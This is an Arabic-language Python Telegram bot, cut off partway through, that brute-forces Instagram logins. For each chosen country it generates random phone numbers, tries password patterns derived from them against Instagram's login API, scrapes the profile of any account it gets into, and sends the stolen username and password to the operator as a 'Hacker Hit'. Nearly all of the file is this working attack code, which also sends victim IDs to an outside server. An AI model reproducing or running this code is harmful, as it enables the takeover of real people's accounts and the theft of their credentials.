import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)

def Start(message):
 Name = message.chat.first_name
 User = message.from_user.username 
 ID = message.chat.id
 A = types.InlineKeyboardMarkup(row_width=2)
 B = types.InlineKeyboardButton(text ="✅ قناه المبرمج" , url = "t.me/OYOYV")
 C = types.InlineKeyboardButton(text ="✅ مراسة مبرمج  " , url = "t.me/EXXBB")
 D =  types.InlineKeyboardButton(text = "✅ بدا الصيد",callback_data="y")
 A.add(B,C,D)
 bot.reply_to(message, """  
*- اهلا عزيزي ( {} )                             
- في بوت صيد  حسابات ( Intagram )✅
- قم بــ ضغط على ( بدا الصيد ) لبدء الصيد               
- معرفك : [ @{} ]                                    
- ايديك : [ {} ]                                        *
""".format(Name,User,ID) , parse_mode = "markdown" , reply_markup = A)	
@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    if call.data =="y":
        button(call.message)
    if call.data =="Iran":
        Iran(call.message)
    if call.data =="Iraq":
         Iraq(call.message)
    if call.data =="Tr":
         TR(call.message)  
    if call.data =="EG":
    	EGYPT(call.message)
    if call.data == "Ku":
    	Kuwait(call.message)
    if call.data == "SA":
    	SAUDIA(call.message)
    if call.data == "Mo":
    	Morocco(call.message)
    if call.data == "OK":
    	ert(call.message)
P  = types.InlineKeyboardButton(text = "🇮🇶 IRAQ : العراق ( زين )", callback_data= 'Iran')
P1 = types.InlineKeyboardButton(text = "🇮🇶 IRAQ : العراق ( اسيا )", callback_data = 'Iraq')
P2 = types.InlineKeyboardButton(text = "🇮🇶 IRAQ : العراق ( كورك )",callback_data = 'OK')
P3 = types.InlineKeyboardButton(text = "🇹🇷 TURKEY : تركيا", callback_data = 'Tr')
P4 = types.InlineKeyboardButton(text = "🇪🇬 EGYPT :  مصر", callback_data = 'EG')
P5 = types.InlineKeyboardButton(text = "🇰🇼 KUWAIT : الكويت", callback_data = 'Ku')
P6 = types.InlineKeyboardButton(text = "🇸🇦 SAUDIA : السعودية", callback_data = 'SA')
P7 = types.InlineKeyboardButton(text = "🇲🇦 MOROCCO : المغرب",callback_data = 'Mo')
def button(message):
    O0 = types.InlineKeyboardMarkup(row_width=1)
    O0.add(P6,P,P1,P2,P3,P4,P5,P7)
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**Choose**",parse_mode='markdown',reply_markup=O0)          
def ert(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(5))))
		username = "+96475110"+us
		password = "075110"+us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_TOP = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_TOP}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			ali=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={ali}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
⌯ 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚘𝚘𝚕𝚜 TUPAC 🐉🔥 ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
⌯ 𝚄𝚂𝙴𝚁 : [ {user_TOP} ] ⌯
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_TOP} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
⌯ ᴘᴀѕѕ : [ {password} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙲𝙷 : [ @OYOYV ] ⌯    
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='TOP')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='TOP1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='TOP2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='TOP3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*تم تفعيل الادة الان انتظر الصيد 🐺 *",parse_mode = "markdown",reply_markup=o) 
		
def Iran(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(5))))
		username = "+96478110"+us
		password = "078110"+us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_TOP = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_TOP}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			ali=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={ali}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
⌯ 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚘𝚘𝚕𝚜 TUPAC 🐉🔥 ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
⌯ 𝚄𝚂𝙴𝚁 : [ {user_TOP} ] ⌯
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_TOP} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
⌯ ᴘᴀѕѕ : [ {password} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙲𝙷 : [ @OYOYV ] ⌯    
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='TOP')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='TOP1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='TOP2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='TOP3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*تم تفعيل الادة الان انتظر الصيد 🐺 *",parse_mode = "markdown",reply_markup=o) 
		
def Iraq(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(5))))
		username = '+96477110' + us
		password = '077110' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_TOP = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_TOP}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			ali=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={ali}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
⌯ 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚘𝚘𝚕𝚜 TUPAC 🐉🔥 ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
⌯ 𝚄𝚂𝙴𝚁 : [ {user_TOP} ] ⌯
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_TOP} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
⌯ ᴘᴀѕѕ : [ {password} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙲𝙷 : [ @OYOYV ] ⌯    
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='TOP')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='TOP1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='TOP2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='TOP3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*تم تفعيل الادة الان انتظر الصيد 🐺 *",parse_mode = "markdown",reply_markup=o) 
def TR(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username =  '+90531' + us
		password = '0531' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_TOP = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_TOP}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			ali=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={ali}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
⌯ 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚘𝚘𝚕𝚜 TUPAC 🐉🔥 ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
⌯ 𝚄𝚂𝙴𝚁 : [ {user_TOP} ] ⌯
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_TOP} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
⌯ ᴘᴀѕѕ : [ {password} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙲𝙷 : [ @OYOYV ] ⌯    
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='TOP')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='TOP1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='TOP2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='TOP3')
		o.add(A1,A2,A3,A4) 
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*تم تفعيل الادة الان انتظر الصيد 🐺 *",parse_mode = "markdown",reply_markup=o) 
##
#
#
#
#
#


#



def EGYPT(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+20112' + us
		password = '0112' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_TOP = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_TOP}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			ali=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={ali}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
⌯ 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚘𝚘𝚕𝚜 TUPAC 🐉🔥 ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
⌯ 𝚄𝚂𝙴𝚁 : [ {user_TOP} ] ⌯
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_TOP} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
⌯ ᴘᴀѕѕ : [ {password} ] ⌯
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
⌯ 𝙲𝙷 : [ @OYOYV ] ⌯    
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='TOP')
		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='TOP1')
		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='TOP2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='TOP3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*تم تفعيل الادة الان انتظر الصيد 🐺 *",parse_mode = "markdown",reply_markup=o) 
##
#
#
#
#
#


#



def Kuwait(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
